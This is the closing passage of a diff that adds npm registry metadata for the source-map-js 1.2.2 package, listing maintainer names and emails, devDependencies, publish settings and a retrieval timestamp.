+                                              "email":  "djchie.dev@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Gary Ye",
+                                              "email":  "garysye@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Nicolas LaleveÌe",
+                                              "email":  "nicolas.lalevee@hibnet.org"
+                                          }
+                                      ],
+                     "clean-publish":  {
+                                           "cleanDocs":  true
+                                       },
+                     "_hasShrinkwrap":  false,
+                     "devDependencies":  {
+                                             "doctoc":  "^0.15.0",
+                                             "webpack":  "^1.12.0",
+                                             "clean-publish":  "^3.1.0"
+                                         },
+                     "_npmOperationalInternal":  {
+                                                     "tmp":  "tmp/source-map-js_1.2.2_1790777289305_0.2979430209810914",
+                                                     "host":  "s3://npm-registry-packages-npm-production"
+                                                 },
+                     "_id":  "source-map-js@1.2.2",
+                     "version":  "1.2.2"
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:49.1271984Z"
+    }
+]
